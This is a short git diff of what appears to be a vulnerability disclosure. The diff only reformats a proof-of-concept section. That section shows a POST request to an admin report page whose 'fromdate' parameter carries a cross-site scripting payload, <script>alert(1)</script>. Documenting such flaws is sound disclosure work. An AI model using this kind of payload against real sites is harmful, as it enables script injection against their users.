@@ -16,9 +16,9 @@ Vulnerable Parameter - `fromdate` & `todate`
 
 # PoCs
 
-Vulnerable URL: /admin/pass-bwdates-reports-details.php
+`Vulnerable URL: /admin/pass-bwdates-reports-details.php`
 
-POST Request
+`POST Request
 
 POST /admin/pass-bwdates-reports-details.php HTTP/1.1
 Host: localhost
@@ -40,3 +40,4 @@ Sec-Fetch-User: ?1
 Priority: u=0, i
 
 fromdate=<script>alert(1)</script>&todate=1111-11-11&submit=
+`
